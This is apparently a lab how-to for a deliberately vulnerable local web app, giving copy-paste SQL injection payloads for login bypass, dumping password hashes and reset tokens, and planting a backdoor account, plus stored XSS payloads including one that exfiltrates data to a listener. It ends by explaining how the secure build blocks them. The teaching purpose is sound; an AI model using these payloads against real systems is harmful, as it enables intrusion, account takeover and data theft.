# Attack How-To (Vulnerable build, in the browser)

Quick, copy-paste steps to run each attack on the **vulnerable** app, plus what each one gets you and
what an attacker could do next.

**Setup**
- Start the vulnerable app: `npm --prefix vulnerable start` → open **http://localhost:3001**
- Demo login (from `npm run db:seed`): **`demo`** / **`Comm7#Ltdxyz`**
- All payloads use **`#`** (not `-- `) because the forms trim spaces, and MySQL's `#` comment needs no trailing space.

---

## Attack 1 — SQL Injection: log in without a password

**Page:** Login (`/`)

Type into the fields:
- **Username:** `' OR '1'='1'#`
- **Password:** `anything`

Click **Login**.

✅ **You should see:** you get logged in and land on the system page — no real password needed.

**What this does:** the `OR '1'='1'` makes the WHERE clause always true, so the database returns the
first user and the `#` comments out the password check. You are now authenticated **as that user**.

**What you can do next:**
- You are logged in as a real account — browse the System page, add/search customers as them.
- Target a *specific* person instead of "the first user": use `' OR username='demo'#` to log in as `demo`.
- From here you can chain **Attack 2** (dump the users table) since you now have a valid session.

---

## Attack 2 — SQL Injection: steal the users table (UNION)

**Page:** System (`/system.html`) — log in first (use Attack 1, or `demo` / `Comm7#Ltdxyz`).

In the **customer search** box, type:

```
' UNION SELECT id, CONCAT(username,' :: ',password_hash,' :: ',salt), NULL, NULL, NULL, NULL, NULL, NULL FROM users#
```

Click **Search**.

✅ **You should see:** the list fills with rows from the **users** table — each line shows a real
**username :: password_hash :: salt**.

> **Why `CONCAT`?** The customer list on screen only ever displays the **name** column — email, phone,
> etc. are fetched but never shown. So we pack username + hash + salt **into the name column** with
> `CONCAT` to make them all visible in one line. (The order of the 8 columns must match the customers
> query; the trailing `NULL`s just fill the unused ones.)

**What this does:** `UNION SELECT` glues a second query onto the first, so results from the private
`users` table are returned through the customer list. You've read data you were never allowed to see.

**What you can do next:**
- Read **any** column or table — just change what's inside `CONCAT(...)`. E.g. leak reset tokens:
  `' UNION SELECT id, CONCAT(username,' :: ',reset_token), NULL, NULL, NULL, NULL, NULL, NULL FROM users#`
- Take the stolen `password_hash` + `salt` and crack them offline (the build uses fast HMAC-SHA256 on
  purpose — see deviation D2), then log in normally with the recovered password.
- Confirm the leak is the whole table, not a match — the search term matches no real customer, yet rows
  come back.

---

## Attack 3 — SQL Injection: create a backdoor account (Register)

**Page:** Register (`/register.html`)

Type into the fields:
- **Username:**
  ```
  backdoor', 'attacker@evil.com', 'f59c16c2d394fd1f437790b0033a1070a8eae7a6c31f041ba1f86ac3b44ad3b5', '0123456789abcdef0123456789abcdef')#
  ```
- **Email:** `x@x.com`
- **Password:** `Comm7#Ltdxyz`

Click **Register**.

This secretly stores a user named **`backdoor`** with a password **you** chose. Now log in with it:
- **Username:** `backdoor`
- **Password:** `Hacked123!`

✅ **You should see:** you log in as `backdoor` — an account whose password the app never set.

**What this does:** the username breaks out of the `INSERT ... VALUES (...)` list and supplies its own
`email`, `password_hash`, and `salt` columns; the `#` comments out the real values the app tried to
store. The stored row therefore has a password hash **you** computed, so you know its password.

**What you can do next:**
- Log in as `backdoor` any time — a permanent way back in, even if the original hole is later noticed.
- You now have a valid session to run **Attack 2** or add malicious customers (**Attack 4**).
- Because you also controlled the `email` column, you could set it to a real user's address to interfere
  with password-reset flows.

> Use a new username each time (e.g. `backdoor2`, …) — registering the same name twice fails with
> "already exists". The hash/salt above are precomputed for the password `Hacked123!`.

---

## Attack 4 — Stored XSS: run JavaScript through a customer name

**Page:** System (`/system.html`) — log in first.

In the **Add Customer** form, set the **Name** to one of the payloads below. Fill any other required
fields and click **Add**. Each one is saved in the database and runs in the browser of **every** user
who opens the System page — that is what makes stored XSS dangerous.

> **Note on cookies:** `alert(document.cookie)` shows up **empty** here — that's the `httpOnly` cookie
> protection working (JavaScript can't read the session cookie in either build). So the payloads below
> show impact that does **not** need the cookie: acting as the victim, defacing the page, and
> redirecting users.

**Option A — Prove your code runs (simplest):**
```
<img src=x onerror="alert('XSS by attacker')">
```
✅ An alert saying **XSS by attacker** pops up. Proof that attacker-controlled JavaScript executes.

**Option B — Act as the victim (session riding):** silently create a customer *as whoever views the page*, using their own logged-in session:
```
<img src=x onerror="fetch('/api/customers',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'pwned-by-xss'})})">
```
✅ A new customer named **pwned-by-xss** appears — your script performed a real authenticated action
that the victim never clicked. `httpOnly` doesn't stop this, because the browser attaches the session
cookie to the `fetch` automatically.

**Option C — Deface the page for everyone:** replace what every visitor sees:
```
<img src=x onerror="document.body.innerHTML='<h1>This site has been hacked</h1>'">
```
✅ The whole page is wiped and replaced. Every user who opens it sees the attacker's message.

**Option D — Redirect users to a malicious/phishing site:**
```
<img src=x onerror="location.href='https://example.com'">
```
✅ Anyone who opens the System page is instantly sent to the attacker's site (imagine a fake login page
built to harvest passwords).

**Prove it is *stored* (not a one-time fluke):** after adding Option A, log out, log back in, and open
`/system.html` again. The alert fires **again** on its own, because the payload was saved in the
database and re-runs every time the list loads.

**What this does:** the saved name is inserted into the page with `innerHTML` (`system.js:38`), so the
browser treats it as real HTML. The broken `<img>` triggers its `onerror` handler and runs your
JavaScript — in the session of **whoever views the page**, not just you.

**What you can do next:**
- **Attack other users, not just yourself.** Because it's stored, one saved payload hits every user who
  opens the page — an admin, another employee — all in their own sessions.
- **Steal data the victim can see** (advanced): fetch a private page and send it to a server you
  control, e.g. `onerror="fetch('/api/customers').then(r=>r.text()).then(d=>new Image().src='http://localhost:9000/?'+encodeURIComponent(d))"`.
  You'd need a listener running on that address to catch it — but it shows how the whole customer list
  can be exfiltrated using the victim's session.
- **Chain it:** combine Option B with the register backdoor idea — have the victim's session create an
  account or change data on your behalf.

---

## Why the same payloads fail on the secure build (:3000)

Run the exact steps against **http://localhost:3000** and they don't work:
- **SQLi (1–3):** the secure build sends input as a bound parameter, so `' OR '1'='1'#` is searched for
  as a literal username and matches nothing → "User does not exist." / no data leaked / no account injected.
- **XSS (4):** the secure build displays the name with `textContent`, so the `<img …>` shows up as plain
  visible text and never runs.
